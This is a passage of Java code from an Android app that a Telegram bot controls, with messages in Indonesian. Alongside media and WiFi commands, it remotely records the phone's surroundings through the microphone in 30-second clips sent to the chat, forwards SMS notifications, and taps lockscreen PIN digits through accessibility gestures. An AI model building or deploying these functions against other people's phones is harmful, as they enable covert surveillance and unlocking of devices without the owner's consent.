            replyT(ctx, chatId, target, ok ? "\u23F8\uFE0F Dijeda — " + st.title
                    : "Gagal menjeda.");
            return;
        }
        if ("tuberesume".equals(aksi)) {
            boolean ok = YouTube.resume(ctx);
            replyT(ctx, chatId, target, ok ? "\u25B6\uFE0F Dilanjutkan — " + st.title
                    : "Gagal melanjutkan.");
            return;
        }
        if ("tubestop".equals(aksi)) {
            final TubeState fs = st;
            tubeState.remove(chatId);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    YouTube.stop(ctx, fs.pkg);
                }
            }).start();
            replyT(ctx, chatId, target, "\u23F9\uFE0F YouTube dihentikan.");
            return;
        }
        long elapsed = (System.currentTimeMillis() - st.startMs) / 1000;
        int pos = (int) (st.baseSec + elapsed);
        int newPos = "tubefwd".equals(aksi) ? pos + 30 : Math.max(0, pos - 30);
        boolean ok = YouTube.play(ctx, st.pkg, st.videoId, newPos);
        if (!ok) {
            replyT(ctx, chatId, target, "Gagal — pastikan Aksesibilitas aktif.");
            return;
        }
        st.baseSec = newPos;
        st.startMs = System.currentTimeMillis();
        replyT(ctx, chatId, target, ("tubefwd".equals(aksi) ? "\u23E9" : "\u23EA")
                + " ke " + YouTube.fmtDur(newPos) + " — " + st.title);
    }

    private static void stopTubeIfPlaying(Context ctx, long chatId) {
        TubeState st = tubeState.remove(chatId);
        if (st != null) {
            final String pkg = st.pkg;
            new Thread(new Runnable() {
                @Override
                public void run() {
                    YouTube.stop(ctx, pkg);
                }
            }).start();
        }
    }

    // ---------- notifikasi proaktif ----------

    private static void doNotifPro(Context ctx, long chatId, String target, String arg) {
        if ("on".equalsIgnoreCase(arg) || "off".equalsIgnoreCase(arg)) {
            doNotifProMaster(ctx, chatId, target, "on".equalsIgnoreCase(arg));
            return;
        }
        sendNotifPanel(ctx, chatId, target);
    }

    private static void sendNotifPanel(Context ctx, long chatId, String target) {
        boolean on = Prefs.notifOn(ctx);
        StringBuilder sb = new StringBuilder();
        sb.append("\uD83D\uDD14 Notifikasi proaktif [").append(target).append("]\n");
        sb.append("Status: ").append(on ? "AKTIF ✅" : "MATI ❌").append("\n");
        sb.append("• SMS masuk: ").append(Prefs.notifSms(ctx) ? "✅" : "❌").append("\n");
        sb.append("• Baterai lemah: ").append(Prefs.notifBatt(ctx) ? "✅" : "❌").append("\n");
        sb.append("• HP dinyalakan: ").append(Prefs.notifBoot(ctx) ? "✅" : "❌").append("\n");
        long nc = Prefs.notifChatId(ctx);
        sb.append("Tujuan: ").append(nc == 0 ? "chat ini" : "chat khusus ✅").append("\n");
        sb.append("(/notifchat untuk pisahkan ke channel/grup sendiri)");
        try {
            JSONObject m = new JSONObject();
            JSONArray kb = new JSONArray();
            JSONArray r1 = new JSONArray();
            JSONObject b1 = new JSONObject();
            b1.put("text", on ? "\u274C Matikan" : "✅ Aktifkan");
            b1.put("callback_data", "cmd:" + target + ":notifprom:" + (on ? "0" : "1"));
            r1.put(b1);
            kb.put(r1);
            JSONArray r2 = new JSONArray();
            String[][] defs = {{"\uD83D\uDCE9 SMS", "sms"}, {"\uD83D\uDD0B Baterai", "batt"}, {"\uD83D\uDCF1 Restart", "boot"}};
            for (String[] d : defs) {
                boolean st = "sms".equals(d[1]) ? Prefs.notifSms(ctx)
                        : "batt".equals(d[1]) ? Prefs.notifBatt(ctx) : Prefs.notifBoot(ctx);
                JSONObject b = new JSONObject();
                b.put("text", (st ? "✅ " : "❌ ") + d[0]);
                b.put("callback_data", "cmd:" + target + ":notifprot:" + d[1]);
                r2.put(b);
            }
            kb.put(r2);
            m.put("inline_keyboard", kb);
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, sb.toString(), m);
        } catch (Exception e) {
            replyT(ctx, chatId, target, sb.toString());
        }
    }

    private static void doNotifProMaster(Context ctx, long chatId, String target, boolean on) {
        Prefs.setNotifOn(ctx, on);
        if (on && !hasSmsPerm(ctx)) {
            replyT(ctx, chatId, target, "🔔 Notifikasi proaktif DIAKTIFKAN.\n⚠️ Izin baca SMS belum diberikan di HP [" + target + "] — buka aplikasi My Device > berikan izin SMS agar notifikasi SMS jalan.");
        } else {
            replyT(ctx, chatId, target, "🔔 Notifikasi proaktif " + (on ? "DIAKTIFKAN ✅" : "DIMATIKAN ❌"));
        }
    }

    private static boolean hasSmsPerm(Context ctx) {
        try {
            return ctx.checkSelfPermission(android.Manifest.permission.RECEIVE_SMS)
                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
        } catch (Exception e) {
            return false;
        }
    }

    private static void doNotifProToggle(Context ctx, long chatId, String target, String which) {
        if ("sms".equals(which)) Prefs.setNotifSms(ctx, !Prefs.notifSms(ctx));
        else if ("batt".equals(which)) Prefs.setNotifBatt(ctx, !Prefs.notifBatt(ctx));
        else if ("boot".equals(which)) Prefs.setNotifBoot(ctx, !Prefs.notifBoot(ctx));
        sendNotifPanel(ctx, chatId, target);
    }

    private static void doNotifProChat(Context ctx, long chatId, String target) {
        PollService.pending.put(chatId, target + ":notifchat");
        replyT(ctx, chatId, target, "🔔 Buat channel/grup Telegram untuk notifikasi (mis. \"Notifikasi HP\"), lalu FORWARD satu pesan dari sana ke chat ini.\nNotifikasi proaktif akan dikirim ke sana — punya folder sendiri, terpisah dari chat perintah.");
    }

    // ---------- mode suara ----------

    private static void doVoiceMode(Context ctx, long chatId, String target, String arg) {
        if ("on".equalsIgnoreCase(arg)) {
            Prefs.setVoiceMode(ctx, chatId, true);
            replyT(ctx, chatId, target, "🎤 Mode suara AKTIF ✅\nKirim voice note ke chat ini — akan ditranskrip & dijalankan sebagai perintah, lalu dibalas dengan suara.\nContoh: \"putar lagu X\", \"jeda\", \"lanjut\", \"berhenti\".\nKirim /modesuara off untuk matikan.");
            return;
        }
        if ("off".equalsIgnoreCase(arg)) {
            Prefs.setVoiceMode(ctx, chatId, false);
            replyT(ctx, chatId, target, "🎤 Mode suara MATI ❌");
            return;
        }
        boolean on = Prefs.voiceMode(ctx, chatId);
        replyT(ctx, chatId, target, "🎤 Mode suara: " + (on ? "AKTIF ✅" : "MATI ❌")
                + "\n/modesuara on|off untuk ubah.");
    }

    // ---------- helper untuk VoiceCmd (package-visible) ----------

    /** Cari & langsung putar hasil pertama. */
    static void voicePlayFirst(final Context ctx, final long chatId, final String target,
                               final String query) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String pkg = tubePkg.get(chatId);
                    if (pkg == null) {
                        java.util.List<String> apps = YouTube.installedApps(ctx);
                        if (apps.isEmpty()) {
                            VoiceCmd.replyVoice(ctx, chatId, "YouTube tidak terinstal di HP ini.");
                            return;
                        }
                        pkg = apps.get(0);
                        tubePkg.put(chatId, pkg);
                    }
                    java.util.List<YouTube.Video> vids = YouTube.search(query);
                    if (vids.isEmpty()) {
                        VoiceCmd.replyVoice(ctx, chatId, "Tidak ketemu " + query);
                        return;
                    }
                    tubeResults.put(chatId, vids);
                    YouTube.Video v = vids.get(0);
                    playTubeVideo(ctx, chatId, target, v, 0);
                    VoiceCmd.replyVoice(ctx, chatId, "Memutar " + v.title);
                } catch (Exception e) {
                    VoiceCmd.replyVoice(ctx, chatId, "Gagal memutar.");
                }
            }
        }).start();
    }

    /** Cari saja, tampilkan daftar. */
    static void voiceSearch(final Context ctx, final long chatId, final String target,
                            final String query) {
        String pkg = tubePkg.get(chatId);
        if (pkg == null) {
            java.util.List<String> apps = YouTube.installedApps(ctx);
            if (apps.isEmpty()) {
                VoiceCmd.replyVoice(ctx, chatId, "YouTube tidak terinstal di HP ini.");
                return;
            }
            pkg = apps.get(0);
            tubePkg.put(chatId, pkg);
        }
        doTubeSearch(ctx, chatId, target, pkg, query);
    }

    static void voiceTubeStop(Context ctx, long chatId) {
        TubeState st = tubeState.remove(chatId);
        String pkg = st != null ? st.pkg : tubePkg.get(chatId);
        if (pkg != null) {
            final String fpkg = pkg;
            final Context fctx = ctx.getApplicationContext();
            new Thread(new Runnable() {
                @Override
                public void run() {
                    YouTube.stop(fctx, fpkg);
                }
            }).start();
        }
    }

    static void voiceTubeSkip(Context ctx, long chatId, String target, boolean fwd) {
        doTubeControl(ctx, chatId, target, fwd ? "tubefwd" : "tubeback");
    }

    static void voiceFoto(Context ctx, long chatId, String target) {
        doFoto(ctx, chatId, target, false);
    }

    // ---------- buka link di Chrome ----------

    private static void doLink(Context ctx, long chatId, String target, String arg) {
        String url = arg == null ? "" : arg.trim();
        if (url.isEmpty()) {
            PollService.pending.put(chatId, target + ":link");
            replyT(ctx, chatId, target, "\uD83D\uDD17 Kirim link yang mau dibuka di HP [" + target + "].");
            return;
        }
        if (!url.matches("(?i)^https?://.*")) url = "https://" + url;
        try {
            android.content.Intent i = new android.content.Intent(
                    android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url));
            boolean chrome = false;
            try {
                ctx.getPackageManager().getPackageInfo("com.android.chrome", 0);
                i.setPackage("com.android.chrome");
                chrome = true;
            } catch (Exception ignored) {
            }
            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            boolean ok = AppLockService.launchIntent(i);
            replyT(ctx, chatId, target, ok
                    ? ("\uD83D\uDD17 Membuka link di " + (chrome ? "Chrome" : "browser") + " [" + target + "].")
                    : "Gagal membuka link — pastikan Aksesibilitas aktif.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    // ---------- dengarkan suara sekitar ----------

    /** chatId yang sedang mode dengarkan */
    static final java.util.Set<Long> dengarOn = new java.util.HashSet<>();

    /** Rekam mic selama `detik`, simpan ke out. @return true jika berhasil. */
    /**
     * Rekam mic selama `detik` ke `out`.
     * @return ukuran file (byte), atau -1 jika gagal.
     */
    static long recordClip(Context ctx, int detik, java.io.File out) {
        long size = recordClipOnce(ctx, detik, out,
                android.media.MediaRecorder.AudioSource.MIC);
        // hasil mencurigakan (terlalu kecil utk durasi tsb) -> coba sumber lain sekali
        if (size >= 0 && size < 4000L * detik / 10) {
            try {
                out.delete();
            } catch (Exception ignored) {
            }
            long s2 = recordClipOnce(ctx, detik, out,
                    android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION);
            if (s2 > size) size = s2;
        }
        return size;
    }

    private static long recordClipOnce(Context ctx, int detik, java.io.File out, int source) {
        android.media.MediaRecorder mr = new android.media.MediaRecorder();
        try {
            mr.setAudioSource(source);
            mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
            mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
            mr.setAudioSamplingRate(44100);
            mr.setAudioEncodingBitRate(128000);
            mr.setOutputFile(out.getAbsolutePath());
            mr.prepare();
            mr.start();
            Thread.sleep(detik * 1000L);
            try {
                mr.stop();
            } catch (Exception ignored) {
            }
            mr.release();
            return (out.exists() ? out.length() : -1);
        } catch (Exception e) {
            try {
                mr.release();
            } catch (Exception ignored) {
            }
            return -1;
        }
    }

    private static void doDengarkan(final Context ctx, final long chatId, final String target) {
        if (dengarOn.contains(chatId)) {
            replyT(ctx, chatId, target, "\uD83C\uDFA7 Sudah mendengarkan. Kirim /berhenti untuk berhenti.");
            return;
        }
        dengarOn.add(chatId);
        replyT(ctx, chatId, target, "\uD83C\uDFA7 Mendengarkan suara sekitar [" + target + "]...\nMengirim rekaman 30 detik berulang.\nKirim /berhenti untuk berhenti.");
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (dengarOn.contains(chatId)) {
                    java.io.File out = new java.io.File(ctx.getExternalFilesDir(null),
                            "dengar_" + System.currentTimeMillis() + ".m4a");
                    long size = recordClip(ctx, 30, out);
                    if (size > 0) {
                        try {
                            java.text.SimpleDateFormat f = new java.text.SimpleDateFormat("HH:mm:ss",
                                    new java.util.Locale("id", "ID"));
                            TelegramApi.sendFile(Prefs.token(ctx), "sendAudio", "audio", chatId,
                                    out, "\uD83C\uDFA7 [" + target + "] " + f.format(new java.util.Date())
                                            + " (" + (size / 1024) + " KB)",
                                    null);
                        } catch (Exception ignored) {
                        }
                        try {
                            out.delete();
                        } catch (Exception ignored) {
                        }
                    } else {
                        replyT(ctx, chatId, target, "\uD83C\uDFA7 Gagal merekam suara di HP [" + target + "].\nPastikan izin Mikrofon diberikan dan tidak ada aplikasi lain (mis. telepon) yang memakai mic.");
                        dengarOn.remove(chatId);
                    }
                    for (int i = 0; i < 5 && dengarOn.contains(chatId); i++) {
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException ignored) {
                        }
                    }
                }
            }
        }).start();
    }

    // ---------- nyalakan layar ----------

    /**
     * /pinpos — kalibrasi titik keypad PIN lockscreen bawaan (tiap HP berbeda).
     * Format: /pinpos &lt;x0&gt; &lt;y0&gt; &lt;lebar&gt; &lt;tinggi&gt; (fraksi 0-1 dari layar).
     * Contoh: /pinpos 0.125 0.55 0.75 0.38
     * Setelah tersimpan, uji dengan /tespin &lt;digit&gt; sampai pas.
     */
    private static void doPinPos(Context ctx, long chatId, String target, String arg) {
        String a = arg == null ? "" : arg.trim();
        if (a.isEmpty()) {
            replyT(ctx, chatId, target,
                    "\uD83C\uDFAF Titik keypad PIN [" + target + "] saat ini:\n" +
                            "x0=" + Prefs.pinGridX0(ctx) + " y0=" + Prefs.pinGridY0(ctx) +
                            " w=" + Prefs.pinGridW(ctx) + " h=" + Prefs.pinGridH(ctx) + "\n\n" +
                            "Set baru: /pinpos <x0> <y0> <lebar> <tinggi>\n" +
                            "(fraksi 0-1 dari layar; x0/y0 = pojok kiri-atas area keypad,\n" +
                            "lebar/tinggi = ukuran area keypad)\n" +
                            "Lalu uji: /tespin 5 — ulangi sampai ketukannya pas.");
            return;
        }
        String[] pp = a.split("\\s+");
        if (pp.length < 4) {
            replyT(ctx, chatId, target, "Format: /pinpos <x0> <y0> <lebar> <tinggi> (contoh: /pinpos 0.125 0.55 0.75 0.38)");
            return;
        }
        try {
            float x0 = Float.parseFloat(pp[0].replace(',', '.'));
            float y0 = Float.parseFloat(pp[1].replace(',', '.'));
            float w = Float.parseFloat(pp[2].replace(',', '.'));
            float h = Float.parseFloat(pp[3].replace(',', '.'));
            if (x0 < 0 || x0 > 1 || y0 < 0 || y0 > 1 || w <= 0 || w > 1 || h <= 0 || h > 1) {
                replyT(ctx, chatId, target, "Nilai harus 0-1 (contoh: /pinpos 0.125 0.55 0.75 0.38).");
                return;
            }
            Prefs.setPinGrid(ctx, x0, y0, w, h);
            replyT(ctx, chatId, target, "\u2705 Titik keypad [" + target + "] tersimpan: " +
                    x0 + " " + y0 + " " + w + " " + h + "\nUji dengan: /tespin <digit>");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Format salah. Contoh: /pinpos 0.125 0.55 0.75 0.38");
        }
    }

    // ================= Revisi 2026-10-13 (#9): kontrol WiFi =================
    /** /wifiscan — daftar jaringan WiFi di sekitar. */
    private static void doWifiScan(final Context ctx, final long chatId, final String target) {
        try {
            final android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                    ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm == null) {
                replyT(ctx, chatId, target, "WiFi tidak tersedia di [" + target + "].");
                return;
            }
            if (!wm.isWifiEnabled()) {
                replyT(ctx, chatId, target, "WiFi mati di [" + target + "] — nyalakan dulu: /wifi on");
                return;
            }
            replyT(ctx, chatId, target, "🔍 Memindai WiFi di [" + target + "]...");
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        try {
                            wm.startScan();
                        } catch (Exception ignored) {
                        }
                        Thread.sleep(4000);
                        java.util.List<android.net.wifi.ScanResult> rs = wm.getScanResults();
                        if (rs == null || rs.isEmpty()) {
                            replyT(ctx, chatId, target, "Tidak ada jaringan (pastikan lokasi/GPS aktif — scan WiFi butuh izin lokasi).");
                            return;
                        }
                        StringBuilder sb = new StringBuilder("📶 WiFi di [" + target + "]:");
                        int n = 0;
                        java.util.Set<String> seen = new java.util.HashSet<>();
                        for (android.net.wifi.ScanResult r : rs) {
                            if (r == null || r.SSID == null || r.SSID.isEmpty() || !seen.add(r.SSID)) continue;
                            n++;
                            int lvl = android.net.wifi.WifiManager.calculateSignalLevel(r.level, 5);
                            sb.append("\n").append(n).append(". ").append(r.SSID)
                                    .append(" (").append(lvl).append("/4)");
                            if (n >= 15) break;
                        }
                        sb.append("\n\nHubungkan: /wificonnect <nama> [sandi]");
                        replyT(ctx, chatId, target, sb.toString());
                    } catch (Exception e) {
                        replyT(ctx, chatId, target, "Gagal scan: " + e.getMessage());
                    }
                }
            }).start();
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    /** /wificonnect <ssid> [sandi] — hubungkan ke WiFi (background). */
    private static void doWifiConnect(final Context ctx, final long chatId,
                                      final String target, String arg) {
        String a = arg == null ? "" : arg.trim();
        if (a.isEmpty()) {
            replyT(ctx, chatId, target, "Pakai: /wificonnect <nama wifi> [kata sandi]");
            return;
        }
        String[] pp = a.split("\\s+", 2);
        final String ssid = pp[0];
        final String pass = pp.length > 1 ? pp[1] : "";
        try {
            if (android.os.Build.VERSION.SDK_INT >= 29) {
                android.net.wifi.WifiNetworkSpecifier.Builder b =
                        new android.net.wifi.WifiNetworkSpecifier.Builder().setSsid(ssid);
                if (!pass.isEmpty()) b.setWpa2Passphrase(pass);
                android.net.NetworkRequest req = new android.net.NetworkRequest.Builder()
                        .addTransportType(android.net.NetworkCapabilities.TRANSPORT_WIFI)
                        .setNetworkSpecifier(b.build())
                        .build();
                android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
                        ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
                replyT(ctx, chatId, target, "📶 Menghubungkan [" + target + "] ke \"" + ssid + "\"...");
                cm.requestNetwork(req, new android.net.ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onAvailable(android.net.Network network) {
                        try {
                            android.net.ConnectivityManager cm2 = (android.net.ConnectivityManager)
                                    ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
                            cm2.bindProcessToNetwork(network);
                        } catch (Exception ignored) {
                        }
                        replyT(ctx, chatId, target, "✅ [" + target + "] terhubung ke \"" + ssid + "\".");
                    }

                    @Override
                    public void onUnavailable() {
                        replyT(ctx, chatId, target, "❌ Gagal terhubung ke \"" + ssid + "\" — cek nama/sandi.");
                    }
                });
            } else {
                android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                        ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                android.net.wifi.WifiConfiguration cfg = new android.net.wifi.WifiConfiguration();
                cfg.SSID = "\"" + ssid + "\"";
                if (!pass.isEmpty()) {
                    cfg.preSharedKey = "\"" + pass + "\"";
                } else {
                    cfg.allowedKeyManagement.set(android.net.wifi.WifiConfiguration.KeyMgmt.NONE);
                }
                int id = wm.addNetwork(cfg);
                if (id < 0) {
                    replyT(ctx, chatId, target, "❌ Gagal menambah jaringan \"" + ssid + "\".");
                    return;
                }
                wm.disconnect();
                boolean ok = wm.enableNetwork(id, true);
                wm.reconnect();
                replyT(ctx, chatId, target, ok ? "✅ [" + target + "] menghubungkan ke \"" + ssid + "\"."
                        : "❌ Gagal terhubung ke \"" + ssid + "\".");
            }
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    /** /tespin <digit> — uji ketuk 1 digit dengan titik tersimpan. */
    private static void doTesPin(final Context ctx, final long chatId, String target, String arg) {
        final String d = arg == null ? "" : arg.trim().replaceAll("[^0-9]", "");
        if (d.length() != 1) {
            replyT(ctx, chatId, target, "Pakai: /tespin <satu digit> (contoh: /tespin 5)");
            return;
        }
        replyT(ctx, chatId, target, "\uD83D\uDCA1 Menyalakan layar [" + target + "] lalu mengetuk digit " + d + "...");
        try {
            android.os.PowerManager pm = (android.os.PowerManager)
                    ctx.getSystemService(Context.POWER_SERVICE);
            @SuppressWarnings("deprecation")
            android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                    android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                            | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "mydevice:tespin");
            wl.acquire(15000);
            try {
                wl.release();
            } catch (Exception ignored) {
            }
            AppLockService.tapPinDigits(d, new AppLockService.GestureCallback() {
                @Override
                public void onDone(boolean ok) {
                    replyT(ctx, chatId, target, ok
                            ? "\u2705 Digit " + d + " diketuk. Cek layar HP [" + target + "] — kalau digitnya masuk, titiknya sudah pas."
                            : "Gagal mengetuk — pastikan Aksesibilitas aktif di [" + target + "].");
                }
            });
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    // ---------- Kalibrasi interaktif /kalibrasi (revisi 2026-10-14) ----------
    // Pengguna tinggal menjawab "ketukan jatuh di tombol angka berapa",
    // posisi + ukuran grid keypad dihitung otomatis (2 titik: digit 1 dan 9).

    private static class KalibState {
        String target;
        int jawab1 = -1;      // digit tempat ketukan "1" mendarat
        float x1, y1;         // pixel ketukan digit 1
        float x9, y9;         // pixel ketukan digit 9
        int iter = 0;         // iterasi verifikasi
    }

    private static final java.util.Map<Long, KalibState> kalibMap = new java.util.HashMap<>();

    /** Baris/kolom digit pada keypad 3x4 (sama dengan AppLockService.tapPinDigits). */
    private static int[] digitRC(int d) {
        if (d == 0) return new int[]{3, 1};
        return new int[]{(d - 1) / 3, (d - 1) % 3};
    }

    /** Nyalakan layar (agar keypad terlihat saat kalibrasi). */
    private static void wakeScreen(Context ctx) {
        try {
            android.os.PowerManager pm = (android.os.PowerManager)
                    ctx.getSystemService(Context.POWER_SERVICE);
            @SuppressWarnings("deprecation")
            android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                    android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                            | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "mydevice:kalibrasi");
            wl.acquire(15000);
            try {
                wl.release();
            } catch (Exception ignored) {
            }
        } catch (Exception ignored) {
        }
    }

    /** Koordinat pixel ketukan untuk satu digit menurut grid saat ini. null bila gagal. */
    private static float[] pinTapXY(Context ctx, int digit) {
        try {
            int[] rc = digitRC(digit);
            float gx0 = Prefs.pinGridX0(ctx), gy0 = Prefs.pinGridY0(ctx);
            float gw = Prefs.pinGridW(ctx), gh = Prefs.pinGridH(ctx);
            android.view.WindowManager wm = (android.view.WindowManager)
                    ctx.getSystemService(Context.WINDOW_SERVICE);
            android.graphics.Point sz = new android.graphics.Point();
            try {
                wm.getDefaultDisplay().getRealSize(sz);
            } catch (Exception e) {
                wm.getDefaultDisplay().getSize(sz);
            }
            if (sz.x <= 0 || sz.y <= 0) return null;
            float x = sz.x * (gx0 + gw * (rc[1] + 0.5f) / 3f);
            float y = sz.y * (gy0 + gh * (rc[0] + 0.5f) / 4f);
            return new float[]{x, y, sz.x, sz.y};
        } catch (Exception e) {
            return null;
        }
    }

    /** Geser grid 1 titik: ketukan untuk digit D mendarat di digit A. */
    private static void nudgeGrid(Context ctx, int intended, int landed) {
        try {
            int[] rcD = digitRC(intended), rcA = digitRC(landed);
            float gx0 = Prefs.pinGridX0(ctx), gy0 = Prefs.pinGridY0(ctx);
            float gw = Prefs.pinGridW(ctx), gh = Prefs.pinGridH(ctx);
            float nx0 = gx0 - (rcA[1] - rcD[1]) * gw / 3f;
            float ny0 = gy0 - (rcA[0] - rcD[0]) * gh / 4f;
            Prefs.setPinGrid(ctx, nx0, ny0, gw, gh);
        } catch (Exception ignored) {
        }
    }

    private static void doKalibrasiStart(final Context ctx, final long chatId, final String target) {
        kalibMap.remove(chatId);
        wakeScreen(ctx);
        final float[] p = pinTapXY(ctx, 1);
        if (p == null) {
            replyT(ctx, chatId, target, "Gagal membaca ukuran layar di [" + target + "].");
            return;
        }
        final KalibState st = new KalibState();
        st.target = target;
        st.x1 = p[0];
        st.y1 = p[1];
        kalibMap.put(chatId, st);
        replyT(ctx, chatId, target,
                "\uD83C\uDFAF Kalibrasi keypad [" + target + "] dimulai.\n"
                        + "Lihat layar HP — saya mengetuk untuk tombol 1...");
        AppLockService.tapPinDigits("1", new AppLockService.GestureCallback() {
            @Override
            public void onDone(boolean ok) {
                if (!ok) {
                    kalibMap.remove(chatId);
                    replyT(ctx, chatId, target,
                            "Gagal mengetuk — pastikan Aksesibilitas aktif di [" + target + "].");
                    return;
                }
                PollService.pending.put(chatId, target + ":kalibrasi1");
                replyT(ctx, chatId, target,
                        "Ketukan jatuh di tombol angka berapa?\n"
                                + "Balas dengan angkanya (0-9).\n"
                                + "Kirim 'batal' untuk berhenti.");
            }
        });
    }

    /** Langkah 1: jawaban untuk ketukan digit 1 -> ketuk digit 9. */
    private static void handleKalibrasi1(final Context ctx, final long chatId,
                                         final String target, String text) {
        final KalibState st = kalibMap.get(chatId);
        if (st == null) {
            replyT(ctx, chatId, target, "Kalibrasi tidak aktif. Mulai dengan /kalibrasi.");
            return;
        }
        String t = text == null ? "" : text.trim().toLowerCase();
        if (t.equals("batal") || t.equals("cancel")) {
            kalibMap.remove(chatId);
            replyT(ctx, chatId, target, "Kalibrasi dibatalkan.");
            return;
        }
        String dg = t.replaceAll("[^0-9]", "");
        if (dg.length() != 1) {
            PollService.pending.put(chatId, target + ":kalibrasi1");
            replyT(ctx, chatId, target,
                    "Balas dengan SATU angka (0-9) — ketukan tadi jatuh di tombol berapa?");
            return;
        }
        st.jawab1 = dg.charAt(0) - '0';
        wakeScreen(ctx);
        final float[] p = pinTapXY(ctx, 9);
        if (p == null) {
            kalibMap.remove(chatId);
            replyT(ctx, chatId, target, "Gagal membaca ukuran layar.");
            return;
        }
        st.x9 = p[0];
        st.y9 = p[1];
        replyT(ctx, chatId, target, "OK, tercatat: " + st.jawab1 + ". Sekarang mengetuk untuk tombol 9...");
        AppLockService.tapPinDigits("9", new AppLockService.GestureCallback() {
            @Override
            public void onDone(boolean ok) {
                if (!ok) {
                    kalibMap.remove(chatId);
                    replyT(ctx, chatId, target, "Gagal mengetuk.");
                    return;
                }
                PollService.pending.put(chatId, target + ":kalibrasi2");
                replyT(ctx, chatId, target,
                        "Ketukan kedua jatuh di tombol angka berapa?\nBalas dengan angkanya (0-9).");
            }
        });
    }

    /** Langkah 2: jawaban untuk ketukan digit 9 -> hitung grid dari 2 titik. */
    private static void handleKalibrasi2(final Context ctx, final long chatId,
                                         final String target, String text) {
        final KalibState st = kalibMap.get(chatId);
        if (st == null) {
            replyT(ctx, chatId, target, "Kalibrasi tidak aktif. Mulai dengan /kalibrasi.");
            return;
        }
        String t = text == null ? "" : text.trim().toLowerCase();
        if (t.equals("batal") || t.equals("cancel")) {
            kalibMap.remove(chatId);
            replyT(ctx, chatId, target, "Kalibrasi dibatalkan.");
            return;
        }
        String dg = t.replaceAll("[^0-9]", "");
        if (dg.length() != 1) {
            PollService.pending.put(chatId, target + ":kalibrasi2");
            replyT(ctx, chatId, target, "Balas dengan SATU angka (0-9).");
            return;
        }
        int jawab9 = dg.charAt(0) - '0';
        int[] rcA = digitRC(st.jawab1); // posisi digit A pada keypad ASLI
        int[] rcB = digitRC(jawab9);    // posisi digit B pada keypad ASLI
        int dcol = rcB[1] - rcA[1];
        int drow = rcB[0] - rcA[0];
        boolean ok2pt = false;
        if (dcol != 0 && drow != 0) {
            float cellW = (st.x9 - st.x1) / dcol;
            float cellH = (st.y9 - st.y1) / drow;
            // ambil ukuran layar dari pinTapXY (elemen 2,3)
            float[] ref = pinTapXY(ctx, 5);
            if (cellW > 0 && cellH > 0 && ref != null) {
                float sw = ref[2], sh = ref[3];
                float ox = st.x1 - cellW * (rcA[1] + 0.5f);
                float oy = st.y1 - cellH * (rcA[0] + 0.5f);
                float nx0 = ox / sw, ny0 = oy / sh;
                float nw = cellW * 3f / sw, nh = cellH * 4f / sh;
                if (nx0 > -0.2f && nx0 < 1f && ny0 > -0.2f && ny0 < 1f
                        && nw > 0.1f && nw <= 1.2f && nh > 0.1f && nh <= 1.2f) {
                    Prefs.setPinGrid(ctx, nx0, ny0, nw, nh);
                    ok2pt = true;
                }
            }
        }
        if (!ok2pt) {
            // fallback: geser posisi saja dari titik pertama
            nudgeGrid(ctx, 1, st.jawab1);
        }
        // verifikasi: ketuk digit 5 (tengah)
        wakeScreen(ctx);
        st.iter = 0;
        replyT(ctx, chatId, target,
                "\uD83D\uDCC0 Grid " + (ok2pt ? "dihitung dari 2 titik" : "disesuaikan")
                        + " dan disimpan. Verifikasi: mengetuk tombol 5...");
        AppLockService.tapPinDigits("5", new AppLockService.GestureCallback() {
            @Override
            public void onDone(boolean ok) {
                if (!ok) {
                    kalibMap.remove(chatId);
                    replyT(ctx, chatId, target, "Gagal mengetuk.");
                    return;
                }
                PollService.pending.put(chatId, target + ":kalibrasi3");
                replyT(ctx, chatId, target,
                        "Cek layar HP — ketukan jatuh di tombol 5?\n"
                                + "Balas 'pas' kalau sudah pas,\n"
                                + "atau balas angkanya kalau masih meleset.");
            }
        });
    }

    /** Langkah 3: verifikasi — 'pas' selesai, atau angka -> geser lagi. */
    private static void handleKalibrasi3(final Context ctx, final long chatId,
                                         final String target, String text) {
        final KalibState st = kalibMap.get(chatId);
        if (st == null) {
            replyT(ctx, chatId, target, "Kalibrasi tidak aktif. Mulai dengan /kalibrasi.");
            return;
        }
        String t = text == null ? "" : text.trim().toLowerCase();
        if (t.equals("batal") || t.equals("cancel")) {
            kalibMap.remove(chatId);
            replyT(ctx, chatId, target, "Kalibrasi dibatalkan.");
            return;
        }
        if (t.equals("pas") || t.equals("ya") || t.equals("sudah") || t.equals("ok")) {
            kalibMap.remove(chatId);
            float gx0 = Prefs.pinGridX0(ctx), gy0 = Prefs.pinGridY0(ctx);
            float gw = Prefs.pinGridW(ctx), gh = Prefs.pinGridH(ctx);
            replyT(ctx, chatId, target,
